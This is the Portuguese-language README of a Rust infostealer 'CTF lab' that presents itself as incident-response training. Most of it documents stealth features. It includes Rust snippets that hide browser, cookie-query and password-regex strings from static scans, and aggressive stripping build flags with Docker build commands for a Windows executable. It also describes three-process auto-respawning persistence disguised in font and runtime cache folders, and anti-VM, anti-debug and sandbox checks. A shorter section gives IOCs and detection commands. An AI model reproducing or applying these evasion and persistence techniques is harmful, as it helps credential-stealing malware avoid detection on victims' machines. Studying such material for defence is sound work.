# 🔬 MyStealer CTF Lab v0.3.1 - Stealth Edition

> **⚠️ EDUCATIONAL PURPOSES ONLY** - Este projeto é exclusivamente para treinamento de **Incident Response** e **Threat Hunting** em ambientes isolados. Uso indevido é **ILEGAL**.

## 🎯 Overview

Laboratório de CTF avançado para estudo de técnicas de infostealers em Rust. Projetado para treinar equipes de Blue Team em detecção e análise de malware moderno.

**Baseado em:**
- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development)
- Técnicas reais de APTs documentadas pelo MITRE ATT&CK

---

## 🆕 O Que Há de Novo na v0.3.1

| Feature | Descrição |
|---------|-----------|
| 🔇 **Intelligent String Obfuscation** | Todas as strings construídas char-by-char em runtime |
| 🏗️ **Build Stealth Optimizado** | RUSTFLAGS agressivos + strip adicional |
| 📝 **Serde Rename Curto** | Campos JSON renomeados para letras únicas |
| 🔐 **SQL Queries Ofuscadas** | Queries construídas em runtime sem strings estáticas |
| 🐍 **Hydra System** | 3 processos redundantes com auto-respawn |
| 🛡️ **Anti-Analysis Completo** | VM, Sandbox, Debugger detection |

---

## 📊 Comparação de Strings no Binário

### ❌ ANTES (v0.2 - strings visíveis)
```bash
$ strings mystealer.exe | wc -l
12847  # Muitas strings detectáveis

$ strings mystealer.exe | grep -iE "password|Chrome|Firefox"
DocumentsDesktopDownloads.ssh.configtxtdocdocxpdfkeypemppkpubkdb...
(?i)password
(?i)secret
GoogleChromeUser DataMicrosoftEdgeBraveBraveSoftware
MozillaFirefoxProfiles
places.sqlite
cookies.sqlite
```

### ✅ DEPOIS (v0.3.1 - ofuscado)
```bash
$ strings mystealer.exe | grep -iE "password|Chrome|Firefox|Cookies|sandbox"
# Apenas 1 resultado (da biblioteca argon2: "password is too long")

$ strings mystealer.exe | grep -iE "(?i)|sqlite|places|cookies"
# Apenas strings internas do SQLite, não nossas queries
```

---

## 🏗️ Arquitetura

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      MYSTEALER v0.3.1 - STEALTH EDITION                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                    🔐 STRING OBFUSCATION LAYER                      │   │
│  │                                                                     │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐  │   │
│  │  │ bs() Helper  │  │ Serde Rename │  │   Runtime SQL Builder    │  │   │
│  │  │              │  │              │  │                          │  │   │
│  │  │ Char-by-char │  │ Fields → a,b │  │ Queries built at runtime │  │   │
│  │  │ construction │  │ c,d,e,f...   │  │ No static SQL strings    │  │   │
│  │  └──────────────┘  └──────────────┘  └──────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────────┐       │
│  │    CORE       │  │  COLLECTORS   │  │      EXFILTRATION         │       │
│  │               │  │               │  │                           │       │
│  │ • Config      │  │ • Browser (b) │  │ • Local File (encrypted)  │       │
│  │ • Crypto      │  │ • System (s)  │  │ • HTTP (mock C2)          │       │
│  │ • Utils       │  │ • Clipboard(c)│  │ • AES-256-GCM output      │       │
│  └───────────────┘  │ • Files (f)   │  └───────────────────────────┘       │
│                     └───────────────┘                                       │
│                                                                             │
│  ┌───────────────────────────────────────────────────────────────────────┐ │
│  │                    🐍 HYDRA PERSISTENCE SYSTEM                         │ │
│  │  ┌─────────┐     ┌─────────┐     ┌─────────┐                          │ │
│  │  │  ALPHA  │◄───►│  BETA   │◄───►│  GAMMA  │   Heartbeat IPC          │ │
│  │  │ Primary │     │Backup 1 │     │Backup 2 │   Auto-respawn (15s)     │ │
│  │  └─────────┘     └─────────┘     └─────────┘                          │ │
│  └───────────────────────────────────────────────────────────────────────┘ │
│                                                                             │
│  ┌───────────────────────────────────────────────────────────────────────┐ │
│  │                    🛡️ ANTI-ANALYSIS MODULE                            │ │
│  │  • VM Detection (DMI, MAC, CPUID, processes, registry)               │ │
│  │  • Debugger Detection (timing, TracerPid, IsDebuggerPresent)         │ │
│  │  • Sandbox Detection (username, resources, uptime)                   │ │
│  │  • Anti-Disassembly (opaque predicates, junk code, indirect calls)   │ │
│  └───────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🔐 Sistema de Ofuscação Inteligente

### 1. Build String (`bs()`) - Construção Char-by-Char

Todas as strings sensíveis são construídas caractere por caractere em runtime:

```rust
// ❌ ANTES - String literal detectável
let browser = "Chrome";

// ✅ DEPOIS - Construído em runtime
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    std::hint::black_box(s)
}
let browser = bs(&['C', 'h', 'r', 'o', 'm', 'e']);
```

### 2. Serde Rename - Campos JSON Curtos

Todos os campos de serialização usam nomes de uma letra:

```rust
// ❌ ANTES - Nome de campo legível
#[derive(Serialize)]
pub struct BrowserData {
    pub browsers_found: Vec<String>,  // "browsers_found" no JSON
    pub total_cookies: u32,           // "total_cookies" no JSON
}

// ✅ DEPOIS - Nome curto
#[derive(Serialize)]
pub struct BrowserData {
    #[serde(rename = "b")]
    pub browsers_found: Vec<String>,  // "b" no JSON
    #[serde(rename = "c")]
    pub total_cookies: u32,           // "c" no JSON
}
```

### 3. SQL Query Builder - Queries em Runtime

Todas as queries SQL são construídas caractere por caractere:

```rust
// ❌ ANTES - Query legível no binário
let query = "SELECT host_key, name, value FROM cookies LIMIT 100";

// ✅ DEPOIS - Construída em runtime
fn build_cookies_query() -> String {
    let mut q = String::with_capacity(100);
    for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
    for c in ['h', 'o', 's', 't', '_', 'k', 'e', 'y', ',', ' '] { q.push(c); }
    for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
    // ... resto da query
    std::hint::black_box(q)
}
```

### 4. Regex Patterns - Construídos em Runtime

```rust
// ❌ ANTES - Pattern detectável
let pattern = Regex::new(r"(?i)password").unwrap();

// ✅ DEPOIS - Construído caractere por caractere
fn build_regex(chars: &[char]) -> Option<Regex> {
    let pattern = bs(chars);
    Regex::new(&pattern).ok()
}
let pattern = build_regex(&['(', '?', 'i', ')', 'p', 'a', 's', 's', 'w', 'o', 'r', 'd']);
```

---

## 🏭 Build System Otimizado

### Dockerfile.windows

```dockerfile
# STEALTH BUILD FLAGS
ENV RUSTFLAGS="-C panic=abort -C debuginfo=0 -C opt-level=z \
               -C lto=fat -C codegen-units=1 -C strip=symbols -C link-arg=-s"

# Build com features de ofuscação
RUN cargo build --release --target x86_64-pc-windows-gnu --features "hydra-auto,silent"

# Strip adicional
RUN x86_64-w64-mingw32-strip --strip-all mystealer.exe
```

### Cargo.toml Profile

```toml
[profile.release]
opt-level = "z"          # Otimiza para tamanho
lto = "fat"              # Link-Time Optimization completo
codegen-units = 1        # Melhor otimização
panic = "abort"          # Remove unwind tables
strip = "symbols"        # Remove símbolos
debug = 0                # Sem debug info
```

---

## 🐍 Sistema Hydra (Persistência Multi-Processo)

```
    ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
    │   ALPHA     │◄───►│    BETA     │◄───►│   GAMMA     │
    │  (Primary)  │     │  (Backup 1) │     │  (Backup 2) │
    └──────┬──────┘     └──────┬──────┘     └──────┬──────┘
           │                   │                   │
           └───────────────────┼───────────────────┘
                               │
                        ┌──────▼──────┐
                        │  IPC Files  │
                        │  .hb .lock  │
                        └─────────────┘
```

| Parâmetro | Valor |
|-----------|-------|
| Heartbeat Interval | 5 segundos |
| Respawn Timeout | 15 segundos |
| Max Backoff | 60 segundos |
| IPC Dir (Linux) | `~/.cache/fontconfig/` |
| IPC Dir (Windows) | `%LOCALAPPDATA%\.cache\ms-runtime\` |

---

## 📦 Estrutura do Projeto

```
mysteellerCTF/
├── src/
│   ├── main.rs                 # Entry point
│   ├── lib.rs                  # Library exports
│   ├── config.rs               # Configuração
│   ├── collectors/             # Módulos de coleta (strings ofuscadas)
│   │   ├── mod.rs              # Collector trait + serde rename
│   │   ├── browser.rs          # Chrome, Firefox, Brave, Edge
│   │   ├── clipboard.rs        # Área de transferência
│   │   ├── files.rs            # Scanner de arquivos sensíveis
│   │   └── system_info.rs      # Info do sistema
│   ├── crypto/
│   │   ├── mod.rs              # CryptoManager + obfuscation
│   │   └── aes.rs              # AES-256-GCM helpers
│   ├── exfil/
│   │   ├── mod.rs              # Exfiltrator trait
│   │   ├── http.rs             # HTTP exfil (mock C2)
│   │   └── local.rs            # Salvar local
│   ├── loader/                 # 🐍 Sistema Hydra
│   │   ├── mod.rs              # Orquestrador
│   │   ├── hydra.rs            # Multi-process redundancy
│   │   └── watchdog.rs         # Integrity monitor
│   └── utils/
│       ├── mod.rs              # Exports
│       ├── anti_analysis.rs    # VM/Sandbox detection
│       ├── anti_debug.rs       # Anti-debug + Anti-disassembly
│       ├── evasion.rs          # Evasion checks
│       └── helpers.rs          # Utility functions
├── challenges/                 # 6 CTF challenges (500 pontos)
├── defenses/                   # Detector de comportamento
├── docs/                       # Documentação técnica
├── Dockerfile.windows          # Cross-compile com RUSTFLAGS
└── output/                     # Dados coletados (encrypted)
```

---

## 🚀 Quick Start

### Build Stealth para Windows
```bash
# Via Docker (recomendado)
docker build -f Dockerfile.windows -t mystealer-stealth .
docker run --rm -v $(pwd)/output:/output mystealer-stealth \
    sh -c "cp /app/target/x86_64-pc-windows-gnu/release/mystealer.exe /output/"

# Verificar que não há strings sensíveis
strings output/mystealer.exe | grep -iE "password|Chrome|Firefox|sandbox"
```

### Build Normal (com logs)
```bash
cargo build --release
./target/release/mystealer --skip-checks
```

---

## 🔧 Features (Cargo)

| Feature | Descrição |
|---------|-----------|
| `lab-mode` | ✅ Ativo por padrão. Verificações de segurança |
| `hydra` | Sistema de redundância de processos |
| `hydra-auto` | Hydra ativado automaticamente |
| `silent` | Remove logs e strings de debug |

---

## 🎮 Challenges CTF

| # | Challenge | Descrição | Pontos |
|---|-----------|-----------|--------|
| 1 | [Análise Estática](challenges/CHALLENGE_01.md) | Strings, imports, estrutura | 40 |
| 2 | [Análise Dinâmica](challenges/CHALLENGE_02.md) | Comportamento, syscalls | 60 |
| 3 | [Criptografia](challenges/CHALLENGE_03.md) | Reverter AES, encontrar chave | 80 |
| 4 | [Evasion](challenges/CHALLENGE_04.md) | Anti-VM, Anti-Debug | 100 |
| 5 | [Hydra Persistence](challenges/CHALLENGE_05.md) | Multi-process, IPC | 120 |
| 6 | [String Obfuscation](challenges/CHALLENGE_06.md) | Reverter bs(), XOR decode | 100 |

**Total: 500 pontos**

---

## 🔍 IOCs (Indicators of Compromise)

### Arquivos
```yaml
Linux:
  - ~/.cache/fontconfig/*.lock
  - ~/.cache/fontconfig/*.hb

Windows:
  - %LOCALAPPDATA%\.cache\ms-runtime\*.lock
  - %LOCALAPPDATA%\.cache\ms-runtime\*.hb
```

### Comportamento
```yaml
behavior:
  - Múltiplos processos idênticos (3 instâncias)
  - Arquivos .hb atualizados a cada 5 segundos
  - Respawn automático após kill (~15s)
  - Acesso a databases SQLite dos browsers
  - Leitura de /etc/machine-id ou registry MachineGuid
```

### Detecção Comportamental
```bash
# Linux
ps aux | grep mystealer | wc -l  # Se > 1, suspeito
find ~/.cache -name "*.hb" -mmin -1  # Arquivos modificados recentemente

# Windows PowerShell
(Get-Process -Name "mystealer" -ErrorAction SilentlyContinue).Count
Get-ChildItem "$env:LOCALAPPDATA\.cache\ms-runtime\*.hb" -ErrorAction SilentlyContinue
```

---

## 🛠️ Tech Stack

| Categoria | Tecnologia |
|-----------|------------|
| **Linguagem** | Rust 1.75+ |
| **Async** | tokio |
| **Crypto** | aes-gcm, argon2 |
| **SQLite** | rusqlite |
| **System** | sysinfo, whoami |
| **Logging** | tracing (condicional) |
| **CLI** | clap |

---

## ⚖️ Legal

Este software é fornecido "como está" apenas para fins educacionais.

**Ao usar, você concorda que:**
- ✅ Usará apenas em ambientes controlados de sua propriedade
- ✅ Não usará para atividades maliciosas ou ilegais
- ✅ Compreende as leis locais sobre segurança cibernética
- ✅ É responsável por qualquer uso indevido

**MIT License** - Educational purposes only.

---

*Built for security research and IR training* 🛡️

**v0.3.1 - Stealth Edition** 🔇

*"The best malware is the one you can't see in strings"*
